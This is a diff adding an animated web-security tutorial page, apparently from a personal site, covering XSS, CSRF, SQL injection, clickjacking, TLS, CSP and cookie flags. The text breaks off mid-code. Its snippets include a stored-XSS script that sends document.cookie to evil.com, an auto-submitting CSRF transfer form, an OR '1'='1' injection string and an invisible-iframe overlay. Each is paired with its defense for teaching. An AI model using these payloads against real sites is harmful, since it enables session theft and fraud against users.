@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web Security</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #111118;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 24px 16px 24px 196px;
+    font-family: system-ui, -apple-system, sans-serif;
+  }
+  #root { width: 100%; max-width: 1120px; }
+  .topnav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; padding: 10px 20px; display: flex; align-items: center; gap: 8px; background: rgba(17,17,24,0.85); backdrop-filter: blur(12px); border-bottom: 1px solid #2a2a38; font-family: system-ui, sans-serif; }
+  .topnav a { text-decoration: none; color: #8888aa; font-size: 13px; transition: color 0.2s; }
+  .topnav a:hover { color: #e8e8f0; }
+  .topnav .name { font-weight: 600; color: #e8e8f0; font-size: 13px; }
+  .topnav .sep { color: #38384a; font-size: 12px; }
+  .topnav .current { color: #7c6fcd; font-size: 13px; font-weight: 500; }
+  .sidenav { position: fixed; top: 38px; left: 0; width: 180px; height: calc(100vh - 38px); background: #111118; border-right: 1px solid #2a2a38; padding: 14px 0; overflow-y: auto; z-index: 200; font-family: system-ui, sans-serif; }
+  .sidenav a { display: block; padding: 6px 16px; font-size: 11px; color: #8888aa; text-decoration: none; transition: color 0.2s, background 0.2s; border-left: 2px solid transparent; }
+  .sidenav a:hover { color: #e8e8f0; background: rgba(124,111,205,0.06); }
+  .sidenav a.active { color: #a99cf0; border-left-color: #7c6fcd; background: rgba(124,111,205,0.1); font-weight: 600; }
+  .sidenav .nav-section { padding: 8px 16px 4px; font-size: 9px; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: #44445a; }
+  .sidenav .nav-section:first-child { padding-top: 4px; }
+</style>
+</head>
+<body>
+<nav class="topnav">
+  <a href="../" class="name">Sharon Zhou</a>
+  <span class="sep">/</span>
+  <a href="../">Animations</a>
+  <span class="sep">/</span>
+  <span class="current">Web Security</span>
+</nav>
+<nav class="sidenav">
+  <div class="nav-section">JavaScript</div>
+  <a href="../event-loop/">Event Loop</a>
+  <a href="../this-keyword/">this Keyword</a>
+  <a href="../hoisting/">Hoisting</a>
+  <a href="../closures/">Closures</a>
+  <a href="../garbage-collection/">Garbage Collection</a>
+  <a href="../event-delegation/">Event Delegation</a>
+  <a href="../iterators-generators/">Iterators &amp; Generators</a>
+  <a href="../xhr-vs-fetch/">XHR vs fetch()</a>
+  <a href="../error-propagation/">Error Propagation</a>
+  <a href="../web-workers/">Web Workers</a>
+  <a href="../prototypal-inheritance/">Prototypal Inheritance</a>
+  <a href="../critical-rendering-path/">Critical Rendering Path</a>
+  <a href="../reflow-vs-repaint/">Reflow vs Repaint</a>
+  <a href="../request-animation-frame/">requestAnimationFrame</a>
+  <a href="../css-box-model/">CSS Box Model &amp; Layout</a>
+  <a href="../cors/">CORS</a>
+  <a href="../websocket-vs-sse/">WebSocket vs SSE</a>
+  <a href="../web-security/" class="active">Web Security</a>
+  <div class="nav-section">Infrastructure</div>
+  <a href="../vms-vs-docker/">VMs vs Docker</a>
+  <a href="../opentelemetry/">OpenTelemetry</a>
+</nav>
+<div id="root" style="margin-top: 36px;"></div>
+
+<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/framer-motion@11/dist/framer-motion.js"></script>
+<script>
+const { useState, useEffect, useRef } = React;
+const { motion, AnimatePresence, useMotionValue, animate } = window.Motion;
+const e = React.createElement;
+const M = motion;
+const AP = AnimatePresence;
+const sp = (s=380,d=28) => ({ type:"spring", stiffness:s, damping:d });
+const ez = { duration:0.32, ease:[0.22,1,0.36,1] };
+
+const T = {
+  bg:"#111118", surface:"#18181f", surface2:"#1e1e28",
+  border:"#2a2a38", border2:"#38384a",
+  text1:"#e8e8f0", text2:"#8888aa", text3:"#44445a",
+  purple:"#7c6fcd", purpleL:"#a99cf0",
+  teal:"#3db89a", tealL:"#6dd4b8",
+  coral:"#c4694a", coralL:"#e08a6a",
+  blue:"#4a8fd4", blueL:"#82b4e8",
+  amber:"#d4a84a", amberL:"#e8c86a",
+  pink:"#c45a8a", pinkL:"#e87aaa",
+  red:"#e05555", redL:"#ff7777",
+  green:"#4aaa6a", greenL:"#6dd48a",
+  codeBase:"#141428",
+};
+
+const TS = {
+  fn:    { color:"#82aaff" },
+  meth:  { color:"#89ddff" },
+  str:   { color:"#c3e88d" },
+  kw:    { color:"#c792ea" },
+  num:   { color:"#f78c6c" },
+  punc:  { color:"#89ddff" },
+  plain: { color:"#a6accd" },
+  bad:   { color:"#ff5370", fontWeight:"bold" },
+  good:  { color:"#c3e88d", fontWeight:"bold" },
+  cmt:   { color:"#546e7a", fontStyle:"italic" },
+  tag:   { color:"#f07178" },
+  attr:  { color:"#ffcb6b" },
+  val:   { color:"#c3e88d" },
+  http:  { color:"#82aaff", fontWeight:"bold" },
+};
+
+/* ─── SCENES ─── */
+const SCENES = [
+  {
+    id:0, act:"01",
+    title:"Web Security Fundamentals",
+    sub:"The web is built on trust — and attackers exploit that trust. Understanding common threats is the first step to building secure applications.",
+    code:[
+      [["cmt","// Common web security threats"]],
+      [["cmt","// XSS, CSRF, SQL Injection,"]],
+      [["cmt","// Clickjacking, and more..."]],
+    ],
+    attack:null,
+    defense:null,
+    diagram:{ type:"intro", actors:["Attacker","Victim","Server"], flows:[] },
+  },
+  {
+    id:1, act:"02",
+    title:"XSS — Cross-Site Scripting",
+    sub:"XSS lets attackers inject malicious scripts into pages viewed by other users. Three types: Stored (persisted in DB), Reflected (in URL params), and DOM-based (client-side only).",
+    code:[
+      [["cmt","// Stored XSS: attacker saves script in DB"]],
+      [["cmt","// Reflected XSS: script in URL params"]],
+      [["cmt","// DOM-based: client JS inserts payload"]],
+      [["plain",""],],
+      [["cmt","// All execute in victim's browser"]],
+      [["cmt","// with full access to cookies, DOM"]],
+    ],
+    attack:{ type:"xss", label:"XSS", color:T.red },
+    defense:null,
+    diagram:{ type:"xss-overview", actors:["Attacker","Server","Victim"], flows:[
+      { from:0, to:1, label:"Inject <script>", color:T.red },
+      { from:2, to:1, label:"Request page", color:T.blue },
+      { from:1, to:2, label:"Page + malicious script", color:T.red },
+    ]},
+  },
+  {
+    id:2, act:"03",
+    title:"XSS Example — Script Injection",
+    sub:"An attacker posts a comment containing a script tag. When other users view the page, the script runs in their browser — stealing cookies, session tokens, or redirecting them.",
+    code:[
+      [["cmt","// Attacker submits this as a comment:"]],
+      [["tag","<script>"]],
+      [["plain","  "],["bad","fetch('https://evil.com/steal?c='"]],
+      [["plain","    "],["bad","+ document.cookie)"]],
+      [["tag","</script>"]],
+      [["plain",""],],
+      [["cmt","// Server stores it, serves to all users"]],
+      [["cmt","// Victim's browser executes it!"]],
+    ],
+    attack:{ type:"xss", label:"Stored XSS", color:T.red },
+    defense:null,
+    diagram:{ type:"xss-attack", actors:["Attacker","Server/DB","Victim"], flows:[
+      { from:0, to:1, label:"POST <script>steal cookies</script>", color:T.red },
+      { from:1, to:1, label:"Stores in DB", color:T.amber },
+      { from:2, to:1, label:"GET /comments", color:T.blue },
+      { from:1, to:2, label:"HTML + injected script", color:T.red },
+      { from:2, to:0, label:"Cookies sent to evil.com", color:T.red },
+    ]},
+  },
+  {
+    id:3, act:"04",
+    title:"XSS Prevention",
+    sub:"Defense in depth: escape all user output, use Content Security Policy headers, sanitize HTML input, and set httpOnly on sensitive cookies.",
+    code:[
+      [["cmt","// 1. Escape output"]],
+      [["fn","escapeHtml"],["punc","("],["plain","userInput"],["punc",")"]],
+      [["plain",""],],
+      [["cmt","// 2. Content-Security-Policy header"]],
+      [["http","CSP"],["punc",": "],["good","script-src 'self'"]],
+      [["plain",""],],
+      [["cmt","// 3. httpOnly cookies"]],
+      [["http","Set-Cookie"],["punc",": "],["good","sid=abc; HttpOnly"]],
+    ],
+    attack:null,
+    defense:{ type:"xss-defense", label:"Escape + CSP + HttpOnly", color:T.green },
+    diagram:{ type:"defense", actors:["User Input","Sanitizer","Safe Output"], flows:[
+      { from:0, to:1, label:"Raw input", color:T.amber },
+      { from:1, to:2, label:"Escaped & sanitized", color:T.green },
+    ]},
+  },
+  {
+    id:4, act:"05",
+    title:"CSRF — Cross-Site Request Forgery",
+    sub:"CSRF tricks an authenticated user's browser into making unintended requests. The browser automatically attaches cookies, so the server can't tell the difference.",
+    code:[
+      [["cmt","// User is logged into bank.com"]],
+      [["cmt","// Attacker hosts a malicious page"]],
+      [["cmt","// that submits a form to bank.com"]],
+      [["plain",""],],
+      [["cmt","// Browser sends cookies automatically"]],
+      [["cmt","// Server sees a valid session → executes"]],
+    ],
+    attack:{ type:"csrf", label:"CSRF", color:T.coral },
+    defense:null,
+    diagram:{ type:"csrf-overview", actors:["Attacker Site","Victim Browser","Bank Server"], flows:[
+      { from:0, to:1, label:"Loads malicious page", color:T.coral },
+      { from:1, to:2, label:"Auto-submits form + cookies", color:T.red },
+      { from:2, to:2, label:"Processes transfer!", color:T.red },
+    ]},
+  },
+  {
+    id:5, act:"06",
+    title:"CSRF Example — Malicious Form",
+    sub:"A hidden form on evil.com auto-submits a money transfer to bank.com. The victim's browser includes their auth cookies — the bank processes it as legitimate.",
+    code:[
+      [["cmt","// On evil.com:"]],
+      [["tag","<form"],["attr"," action"],["punc","="],["val","\"bank.com/transfer\""]],
+      [["plain","      "],["attr","method"],["punc","="],["val","\"POST\""],["tag",">"]],
+      [["plain","  "],["tag","<input"],["attr"," name"],["punc","="],["val","\"to\""],["attr"," value"],["punc","="],["val","\"attacker\""],["tag","/>"]],
+      [["plain","  "],["tag","<input"],["attr"," name"],["punc","="],["val","\"amt\""],["attr"," value"],["punc","="],["val","\"10000\""],["tag","/>"]],
+      [["tag","</form>"]],
+      [["tag","<script>"],["bad","document.forms[0].submit()"],["tag","</script>"]],
+    ],
+    attack:{ type:"csrf", label:"Hidden Form Attack", color:T.coral },
+    defense:null,
+    diagram:{ type:"csrf-attack", actors:["evil.com","Victim","bank.com"], flows:[
+      { from:0, to:1, label:"Hidden auto-submit form", color:T.coral },
+      { from:1, to:2, label:"POST /transfer + session cookie", color:T.red },
+      { from:2, to:2, label:"$10,000 transferred!", color:T.red },
+    ]},
+  },
+  {
+    id:6, act:"07",
+    title:"CSRF Prevention",
+    sub:"Use anti-CSRF tokens (unique per session/request), SameSite cookie attribute, and check Origin/Referer headers. Tokens ensure requests come from your own forms.",
+    code:[
+      [["cmt","// 1. Anti-CSRF token in form"]],
+      [["tag","<input"],["attr"," type"],["punc","="],["val","\"hidden\""],["attr"," name"],["punc","="],["val","\"_csrf\""]],
+      [["plain","  "],["attr","value"],["punc","="],["good","\"a8f3...unique\""],["tag","/>"]],
+      [["plain",""],],
+      [["cmt","// 2. SameSite cookie"]],
+      [["http","Set-Cookie"],["punc",": "],["good","sid=abc; SameSite=Strict"]],
+      [["plain",""],],
+      [["cmt","// 3. Check Origin header"]],
+      [["kw","if"],["punc"," ("],["plain","origin "],["punc","!== "],["str","'bank.com'"],["punc",") "],["bad","reject"]],
+    ],
+    attack:null,
+    defense:{ type:"csrf-defense", label:"Token + SameSite + Origin", color:T.green },
+    diagram:{ type:"defense", actors:["Your Form","Server","evil.com"], flows:[
+      { from:0, to:1, label:"Request + valid CSRF token", color:T.green },
+      { from:2, to:1, label:"Request (no token)", color:T.red },
+      { from:1, to:2, label:"403 Forbidden", color:T.green },
+    ]},
+  },
+  {
+    id:7, act:"08",
+    title:"SQL Injection",
+    sub:"Attackers insert SQL code through user inputs to manipulate database queries. Can read, modify, or delete data — even drop entire tables.",
+    code:[
+      [["cmt","// Vulnerable query:"]],
+      [["str","\"SELECT * FROM users"]],
+      [["str","  WHERE name = '\""],["punc"," + "],["bad","userInput"],["punc"," + "],["str","\"'\""]],
+      [["plain",""],],
+      [["cmt","// Attacker input:"]],
+      [["bad","' OR '1'='1' --"]],
+      [["plain",""],],
+      [["cmt","// Result: returns ALL users!"]],
+    ],
+    attack:{ type:"sqli", label:"SQL Injection", color:T.pink },
+    defense:null,
+    diagram:{ type:"sqli", actors:["Attacker","Web App","Database"], flows:[
+      { from:0, to:1, label:"Input: ' OR 1=1 --", color:T.red },
+      { from:1, to:2, label:"SELECT * WHERE name='' OR 1=1", color:T.red },
+      { from:2, to:1, label:"All rows returned!", color:T.red },
+      { from:1, to:0, label:"Sensitive data exposed", color:T.red },
+    ]},
+  },
+  {
+    id:8, act:"09",
+    title:"Clickjacking",
+    sub:"An invisible iframe overlays a legitimate site on top of an attacker's page. Users think they're clicking one thing but are actually clicking on the hidden site.",
+    code:[
+      [["cmt","// Attacker's page:"]],
+      [["tag","<style>"]],
+      [["plain","  "],["attr","iframe"],["punc"," { "],["bad","opacity: 0"],["punc",";"]],
+      [["plain","    "],["bad","position: absolute; z-index: 999"],["punc"," }"]],
+      [["tag","</style>"]],
+      [["tag","<iframe"],["attr"," src"],["punc","="],["val","\"bank.com/transfer\""],["tag","/>"]],
+      [["tag","<button>"],["plain","Click for prize!"],["tag","</button>"]],
+      [["cmt","// User clicks 'prize' → clicks iframe"]],
+    ],
+    attack:{ type:"clickjack", label:"Clickjacking", color:T.amber },
+    defense:null,
+    diagram:{ type:"clickjack", actors:["Attacker Page","Hidden iframe","Victim"], flows:[
+      { from:0, to:0, label:"\"Win a prize!\" button", color:T.amber },
+      { from:1, to:0, label:"Invisible bank.com overlay", color:T.red },
+      { from:2, to:0, label:"Clicks visible button", color:T.blue },
+      { from:2, to:1, label:"Actually clicks bank action!", color:T.red },
+    ]},
+  },
+  {
+    id:9, act:"10",
+    title:"HTTPS and TLS",
+    sub:"HTTPS encrypts data between browser and server using TLS. Without it, attackers on the network can read passwords, cookies, and personal data in transit (man-in-the-middle).",
+    code:[
+      [["cmt","// Without HTTPS (HTTP):"]],
+      [["bad","GET /login?pass=secret123"]],
+      [["cmt","// ↑ Visible to anyone on network!"]],
+      [["plain",""],],
+      [["cmt","// With HTTPS:"]],
+      [["good","TLS Handshake → Encrypted tunnel"]],
+      [["good","GET /login → "],["str","0x8f3a...encrypted"]],
+      [["cmt","// ↑ Unreadable to attackers"]],
+    ],
+    attack:null,
+    defense:{ type:"tls", label:"TLS Encryption", color:T.green },
+    diagram:{ type:"tls", actors:["Browser","Network","Server"], flows:[
+      { from:0, to:2, label:"TLS Handshake", color:T.green },
+      { from:0, to:2, label:"Encrypted data", color:T.green },
+      { from:1, to:1, label:"Can't read!", color:T.red },
+    ]},
+  },
+  {
+    id:10, act:"11",
+    title:"Content Security Policy (CSP)",
+    sub:"CSP is an HTTP header that restricts where resources (scripts, styles, images) can load from. Blocks inline scripts by default — a powerful XSS mitigation.",
+    code:[
+      [["cmt","// CSP header example:"]],
+      [["http","Content-Security-Policy"],["punc",":"]],
+      [["plain","  "],["good","default-src 'self'"],["punc",";"]],
+      [["plain","  "],["good","script-src 'self' cdn.example.com"],["punc",";"]],
+      [["plain","  "],["good","style-src 'self' 'unsafe-inline'"],["punc",";"]],
+      [["plain","  "],["good","img-src *"],["punc",";"]],
+      [["plain",""],],
+      [["cmt","// Blocks: inline <script>, eval(), "]],
+      [["cmt","// scripts from unauthorized origins"]],
+    ],
+    attack:null,
+    defense:{ type:"csp", label:"CSP Header", color:T.green },
+    diagram:{ type:"csp", actors:["Your Server","Browser","evil.com"], flows:[
+      { from:0, to:1, label:"CSP: script-src 'self'", color:T.green },
+      { from:2, to:1, label:"<script src='evil.com/x.js'>", color:T.red },
+      { from:1, to:1, label:"Blocked by CSP!", color:T.green },
+    ]},
+  },
+  {
+    id:11, act:"12",
+    title:"Authentication Security",
+    sub:"Cookies vs tokens, and the flags that protect them. httpOnly prevents JS access (stops XSS cookie theft). Secure ensures HTTPS-only. SameSite stops CSRF.",
+    code:[
+      [["cmt","// Secure cookie configuration:"]],
+      [["http","Set-Cookie"],["punc",": "],["str","session=abc123"]],
+      [["plain","  "],["good","HttpOnly"],["cmt","  // No JS access"]],
+      [["plain","  "],["good","Secure"],["cmt","    // HTTPS only"]],
+      [["plain","  "],["good","SameSite=Lax"],["cmt"," // CSRF protection"]],
+      [["plain","  "],["good","Path=/"],],
+      [["plain","  "],["good","Max-Age=3600"],],
+      [["plain",""],],
+      [["cmt","// JWT alternative: stored in memory"]],
+      [["cmt","// (not localStorage — XSS risk!)"]],
+    ],
+    attack:null,
+    defense:{ type:"auth", label:"Cookie Flags", color:T.green },
+    diagram:{ type:"auth", actors:["Browser","Cookie Jar","Server"], flows:[
+      { from:2, to:0, label:"Set-Cookie: HttpOnly; Secure", color:T.green },
+      { from:0, to:1, label:"Stored securely", color:T.green },
+      { from:0, to:2, label:"Auto-attached on requests", color:T.blue },
+    ]},
+  },
+  {
+    id:12, act:"13",
+    title:"OWASP Top 10 Overview",
+    sub:"The OWASP Top 10 is the industry standard for web application security risks. These are the most critical threats every developer should know.",
+    code:[
+      [["cmt","// OWASP Top 10 (2021):"]],
+      [["num","A01"],["plain"," Broken Access Control"]],
+      [["num","A02"],["plain"," Cryptographic Failures"]],
+      [["num","A03"],["plain"," Injection (SQL, XSS, etc)"]],
+      [["num","A04"],["plain"," Insecure Design"]],
+      [["num","A05"],["plain"," Security Misconfiguration"]],
+      [["num","A06"],["plain"," Vulnerable Components"]],
+      [["num","A07"],["plain"," Auth Failures"]],
+      [["num","A08"],["plain"," Data Integrity Failures"]],
+      [["num","A09"],["plain"," Logging/Monitoring Gaps"]],
+      [["num","A10"],["plain"," SSRF"]],
+    ],
+    attack:null,
+    defense:null,
+    diagram:{ type:"owasp", actors:[], flows:[] },
+  },
+  {
+    id:13, act:"✓",
+    title:"Web Security Summary",
+    sub:"Defense in depth: layer multiple protections. No single measure is enough — combine CSP, input validation, secure cookies, HTTPS, and CSRF tokens.",
+    code:[
+      [["cmt","// Security checklist:"]],
+      [["good","✓"],["plain"," Escape & sanitize all user input"]],
+      [["good","✓"],["plain"," Use Content-Security-Policy"]],
+      [["good","✓"],["plain"," Set HttpOnly, Secure, SameSite"]],
+      [["good","✓"],["plain"," CSRF tokens on state changes"]],
+      [["good","✓"],["plain"," Parameterized SQL queries"]],
+      [["good","✓"],["plain"," X-Frame-Options / frame-ancestors"]],
+      [["good","✓"],["plain"," HTTPS everywhere"]],
+      [["good","✓"],["plain"," Regular dependency audits"]],
+    ],
+    attack:null,
+    defense:null,
+    diagram:null,
+    finale:true,
+  },
+];
+
+/* ─── DETAIL CONTENT ─── */
+const DETAILS = {
+  code: {
+    title:"Code / Config",
+    color:T.purpleL,
+    sections:[
+      {heading:"What to watch",body:"Each scene shows either a vulnerable code pattern (highlighted in red) or a defensive configuration (highlighted in green). Pay attention to the contrast between insecure and secure approaches."},
+      {heading:"Common patterns",body:"• Never trust user input\n• Always escape output context-specifically\n• Use parameterized queries for SQL\n• Set security headers on every response\n• Validate on the server, not just the client"},
+    ]
+  },
+  attack: {
+    title:"Attack Vector",
+    color:T.redL,
+    sections:[
+      {heading:"How attacks work",body:"Most web attacks exploit trust boundaries:\n\n• XSS: Server trusts user input as safe HTML\n• CSRF: Server trusts any request with valid cookies\n• SQL Injection: Database trusts query strings\n• Clickjacking: User trusts what they see\n\nEach exploits a different layer of the stack."},
+      {heading:"Attack surface",body:"Every point where data enters your application is a potential attack vector: form inputs, URL parameters, headers, cookies, file uploads, API endpoints, WebSocket messages."},
+    ]
+  },
+  defense: {
+    title:"Defense Strategy",
+    color:T.greenL,
+    sections:[
+      {heading:"Defense in depth",body:"No single defense is sufficient. Layer protections:\n\n1. Input validation — reject bad data early\n2. Output encoding — escape for the right context\n3. Security headers — CSP, X-Frame-Options\n4. Cookie flags — HttpOnly, Secure, SameSite\n5. HTTPS — encrypt everything in transit\n6. Monitoring — detect and respond to attacks"},
+      {heading:"Principle of least privilege",body:"Give each component only the access it needs. Don't run services as root. Don't grant broad database permissions. Don't expose internal APIs to the public."},
+    ]
+  },
+  diagram: {
+    title:"Attack Flow",
+    color:T.blueL,
+    sections:[
+      {heading:"Reading the diagram",body:"Red arrows show malicious data flow — the path an attacker's payload takes through the system. Green arrows show defensive measures blocking or sanitizing the attack. Blue arrows show normal, legitimate traffic."},
+      {heading:"Trust boundaries",body:"Every arrow that crosses from one actor to another crosses a trust boundary. Security vulnerabilities exist where these boundaries aren't properly enforced."},
+    ]
+  },
+};
+
+/* ─── COMPONENTS ─── */
+const CodePanel = ({ tokens }) =>
+  e("div", { style:{ background:T.codeBase, borderRadius:12, overflow:"hidden", border:`1px solid ${T.border}` } },
+    e("div", { style:{ padding:"10px 14px 8px", borderBottom:`1px solid ${T.border}`, display:"flex", gap:7 } },
+      ...["#ff5f57","#febc2e","#28c840"].map((c,i) =>
+        e("div", { key:i, style:{ width:11, height:11, borderRadius:"50%", background:c } })
+      )
+    ),
+    e("div", { style:{ padding:"18px 22px 22px", fontFamily:"'SF Mono','Fira Code','Consolas',monospace", fontSize:12, lineHeight:1.95 } },
+      tokens.map((line, li) =>
+        e("div", { key:li, style:{ paddingLeft:0, borderRadius:3, display:"block" } },
+          line.map(([cls, txt], ti) =>
+            e("span", { key:ti, style:{ ...TS[cls], whiteSpace:"pre" } }, txt)
+          )
+        )
+      )
+    )
+  );
+
+const Panel = ({ label, children, style={}, focused=false, onClick }) =>
+  e(M.div, {
+    onClick,
+    animate:{
+      borderColor: focused ? T.purple : T.border2,
+      boxShadow: focused ? `0 0 16px ${T.purple}30, inset 0 0 12px ${T.purple}08` : "0 0 0px transparent"
+    },
+    transition:{ duration:0.4 },
+    style:{ borderRadius:12, border:"1.5px solid", background:T.surface, overflow:"hidden", cursor:onClick?"pointer":"default", ...style }
+  },
+    label && e("div", { style:{ padding:"8px 13px", borderBottom:`1px solid ${T.border}` } },
+      e("span", { style:{ fontSize:10, fontWeight:600, letterSpacing:"0.06em", color:T.text2 } }, label)
+    ),
+    e("div", { style:{ padding:12 } }, children)
+  );
+
+/* ─── ATTACK FLOW DIAGRAM ─── */
+const FlowDiagram = ({ diagram, focused, onClick }) => {
+  if (!diagram) return null;
+
+  /* OWASP special */
+  if (diagram.type === "owasp") {
+    const items = [
+      { id:"A01", label:"Broken Access Control", c:T.red, pct:94 },
+      { id:"A02", label:"Cryptographic Failures", c:T.coral, pct:80 },
+      { id:"A03", label:"Injection", c:T.pink, pct:77 },
+      { id:"A04", label:"Insecure Design", c:T.amber, pct:68 },
+      { id:"A05", label:"Security Misconfig", c:T.amber, pct:64 },
+      { id:"A06", label:"Vulnerable Components", c:T.amber, pct:58 },
+      { id:"A07", label:"Auth Failures", c:T.coral, pct:52 },
+      { id:"A08", label:"Data Integrity", c:T.blue, pct:46 },
+      { id:"A09", label:"Logging Gaps", c:T.blue, pct:40 },
+      { id:"A10", label:"SSRF", c:T.teal, pct:34 },
+    ];
+    return e(M.div, {
+      onClick,
+      animate:{ borderColor: focused ? T.purple : T.border2, boxShadow: focused ? `0 0 16px ${T.purple}30` : "none" },
+      transition:{ duration:0.4 },
+      style:{ borderRadius:12, border:"1.5px solid", background:T.surface, overflow:"hidden", cursor:"pointer" }
+    },
+      e("div", { style:{ padding:"8px 13px", borderBottom:`1px solid ${T.border}` } },
+        e("span", { style:{ fontSize:10, fontWeight:600, letterSpacing:"0.06em", color:T.text2 } }, "OWASP Top 10 — Prevalence")
+      ),
+      e("div", { style:{ padding:"10px 14px" } },
+        items.map((it,i) => e(M.div, { key:it.id, initial:{opacity:0,x:-12}, animate:{opacity:1,x:0}, transition:{delay:i*0.06,...ez},
+          style:{ display:"flex", alignItems:"center", gap:8, marginBottom:5, fontSize:10 }
+        },
+          e("span", { style:{ color:it.c, fontWeight:700, width:28, flexShrink:0, fontFamily:"monospace" } }, it.id),
+          e("div", { style:{ flex:1, height:12, background:T.surface2, borderRadius:4, overflow:"hidden", position:"relative" } },
+            e(M.div, { initial:{width:0}, animate:{width:`${it.pct}%`}, transition:{delay:i*0.06+0.2, duration:0.5, ease:"easeOut"},
+              style:{ height:"100%", background:`${it.c}88`, borderRadius:4 }
+            })
+          ),
+          e("span", { style:{ color:T.text2, width:70, textAlign:"right", flexShrink:0 } }, it.label)
+        ))
+      )
+    );
+  }
+
+  /* Intro diagram */
+  if (diagram.type === "intro") {
+    const threats = [
+      { label:"XSS", color:T.red, x:20, y:15 },
+      { label:"CSRF", color:T.coral, x:55, y:10 },
+      { label:"SQLi", color:T.pink, x:80, y:20 },
+      { label:"Clickjack", color:T.amber, x:15, y:55 },
+      { label:"MitM", color:T.purple, x:50, y:60 },
+      { label:"SSRF", color:T.teal, x:82, y:55 },
+    ];
+    return e(M.div, {
+      onClick,
+      animate:{ borderColor: focused ? T.purple : T.border2, boxShadow: focused ? `0 0 16px ${T.purple}30` : "none" },
+      transition:{ duration:0.4 },
+      style:{ borderRadius:12, border:"1.5px solid", background:T.surface, overflow:"hidden", cursor:"pointer" }
+    },
+      e("div", { style:{ padding:"8px 13px", borderBottom:`1px solid ${T.border}` } },
+        e("span", { style:{ fontSize:10, fontWeight:600, letterSpacing:"0.06em", color:T.text2 } }, "Threat Landscape")
+      ),
+      e("div", { style:{ padding:16, position:"relative", minHeight:120 } },
+        /* Central shield */
+        e(M.div, { animate:{scale:[1,1.05,1]}, transition:{duration:2,repeat:Infinity},
+          style:{ position:"absolute", left:"50%", top:"50%", transform:"translate(-50%,-50%)", width:48, height:48, borderRadius:"50%", border:`2px solid ${T.green}66`, background:`${T.green}14`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:22, zIndex:2 }
+        }, "\u{1F6E1}"),
+        /* Threat bubbles */
+        threats.map((t,i) => e(M.div, {
+          key:t.label, initial:{opacity:0,scale:0}, animate:{opacity:1,scale:1}, transition:{delay:i*0.12,...sp(300,22)},
+          style:{ position:"absolute", left:`${t.x}%`, top:`${t.y}%`, padding:"4px 10px", borderRadius:20, border:`1px solid ${t.color}66`, background:`${t.color}18`, fontSize:10, fontWeight:600, color:t.color, whiteSpace:"nowrap" }
+        }, t.label))
+      )
+    );
+  }
+
+  /* Standard flow diagram */
+  const actorColors = {
+    "Attacker": T.red, "Attacker Site": T.red, "evil.com": T.red,
+    "Victim": T.blue, "Victim Browser": T.blue, "User Input": T.amber,
+    "Server": T.teal, "Server/DB": T.teal, "Bank Server": T.teal, "bank.com": T.teal,
+    "Web App": T.teal, "Database": T.purple, "Sanitizer": T.green, "Safe Output": T.green,
+    "Your Form": T.green, "Your Server": T.green, "Browser": T.blue, "Cookie Jar": T.amber,
+    "Network": T.text3, "Hidden iframe": T.amber, "Attacker Page": T.red,
+  };
+
+  return e(M.div, {
+    onClick,
+    animate:{ borderColor: focused ? T.purple : T.border2, boxShadow: focused ? `0 0 16px ${T.purple}30` : "none" },
+    transition:{ duration:0.4 },
+    style:{ borderRadius:12, border:"1.5px solid", background:T.surface, overflow:"hidden", cursor:"pointer" }
+  },
+    e("div", { style:{ padding:"8px 13px", borderBottom:`1px solid ${T.border}` } },
+      e("span", { style:{ fontSize:10, fontWeight:600, letterSpacing:"0.06em", color:T.text2 } }, "Attack Flow")
+    ),
+    e("div", { style:{ padding:"14px 16px" } },
+      /* Actors row */
+      e("div", { style:{ display:"flex", justifyContent:"space-between", marginBottom:16 } },
+        diagram.actors.map((a,i) => {
+          const ac = actorColors[a] || T.text2;
+          return e(M.div, { key:a, initial:{opacity:0,y:-8}, animate:{opacity:1,y:0}, transition:{delay:i*0.1,...ez},
+            style:{ display:"flex", flexDirection:"column", alignItems:"center", gap:4, flex:1 }
+          },
+            e("div", { style:{ width:32, height:32, borderRadius:"50%", border:`1.5px solid ${ac}66`, background:`${ac}14`, display:"flex", alignItems:"center", justifyContent:"center", fontSize:14 } },
+              a.includes("Attacker") || a.includes("evil") ? "\u{1F47E}" :
+              a.includes("Victim") || a.includes("Browser") || a.includes("User") ? "\u{1F464}" :
+              a.includes("Server") || a.includes("bank") || a.includes("App") ? "\u{1F5A5}" :
+              a.includes("Database") ? "\u{1F4BE}" :
+              a.includes("Sanitizer") || a.includes("Safe") || a.includes("Your") ? "\u{1F6E1}" :
+              a.includes("Cookie") ? "\u{1F36A}" :
+              a.includes("Network") ? "\u{1F310}" :
+              a.includes("iframe") ? "\u{1F4CB}" : "\u{1F4E6}"
+            ),
+            e("div", { style:{ fontSize:9, color:ac, fontWeight:600, textAlign:"center" } }, a)
+          );
+        })
+      ),
+      /* Flow arrows */
+      diagram.flows.map((f,i) => e(M.div, {
+        key:i, initial:{opacity:0,x:-10}, animate:{opacity:1,x:0}, transition:{delay:0.3+i*0.15,...ez},
+        style:{ display:"flex", alignItems:"center", gap:6, marginBottom:6, padding:"4px 8px", borderRadius:6, background:`${f.color}08`, border:`1px solid ${f.color}22` }
+      },
+        e("span", { style:{ fontSize:9, color:T.text3, fontWeight:600, width:18, flexShrink:0, textAlign:"center" } }, diagram.actors[f.from] ? diagram.actors[f.from].split(/[\s/]/)[0].substring(0,4) : ""),
+        e("span", { style:{ fontSize:12, color:f.color } }, f.color === T.green ? "\u2192" : f.from <= f.to ? "\u2192" : "\u2190"),
+        e("span", { style:{ fontSize:9, color:T.text3, fontWeight:600, width:18, flexShrink:0, textAlign:"center" } }, diagram.actors[f.to] ? diagram.actors[f.to].split(/[\s/]/)[0].substring(0,4) : ""),
+        e("span", { style:{ fontSize:10, color:f.color, fontFamily:"'SF Mono',monospace", flex:1 } }, f.label)
+      ))
+    )
+  );
+};
+
+/* ─── ATTACK/DEFENSE BADGE ─── */
+const StatusBadge = ({ attack, defense, onClick }) => {
+  const item = attack || defense;
+  if (!item) return e(Panel, { label: attack === null && defense === null ? "Status" : "Status", onClick },
